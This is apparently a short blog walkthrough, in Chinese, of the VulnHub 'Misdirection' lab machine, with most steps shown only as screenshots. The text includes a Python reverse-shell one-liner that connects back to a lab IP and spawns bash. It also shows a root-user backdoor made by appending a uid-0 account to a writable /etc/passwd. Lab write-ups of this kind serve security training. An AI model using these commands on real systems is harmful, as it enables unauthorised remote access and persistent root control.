---
layout: post
title:  "Misdirection"
description: walkthrough
category: vulnhub
---
# Misdirection

![image-20200620201738035]({{ site.url }}/assets/Misdirection.assets/image-20200620201738035.png)



![image-20200620201922393]({{ site.url }}/assets/Misdirection.assets/image-20200620201922393.png)



![image-20200620203206697]({{ site.url }}/assets/Misdirection.assets/image-20200620203206697.png)





![image-20200620204041701]({{ site.url }}/assets/Misdirection.assets/image-20200620204041701.png)



![image-20200620205831163]({{ site.url }}/assets/Misdirection.assets/image-20200620205831163.png)

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.128",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

![image-20200620210205666]({{ site.url }}/assets/Misdirection.assets/image-20200620210205666.png)

![image-20200620210736685]({{ site.url }}/assets/Misdirection.assets/image-20200620210736685.png)



![image-20200620211706511]({{ site.url }}/assets/Misdirection.assets/image-20200620211706511.png)

passwd可写。

直接增加用户即可

首先先制作用户的hash

```bash
openssl passwd -1 -salt evil abcdef
```

![image-20200619115605888]({{ site.url }}/assets/Misdirection.assets/image-20200619115605888.png)

`$1$evil$PJUrXHFg5Juh42jLCKQs10`

然后仿照passwd文件格式伪造用户信息

```bash
evil:$1$evil$PJUrXHFg5Juh42jLCKQs10:0:0::/root:/bin/bash
```

```bash
echo 'evil:$1$evil$PJUrXHFg5Juh42jLCKQs10:0:0::/root:/bin/bash' >> /etc/passwd
```

![image-20200620212243538]({{ site.url }}/assets/Misdirection.assets/image-20200620212243538.png)

![image-20200620212534003]({{ site.url }}/assets/Misdirection.assets/image-20200620212534003.png)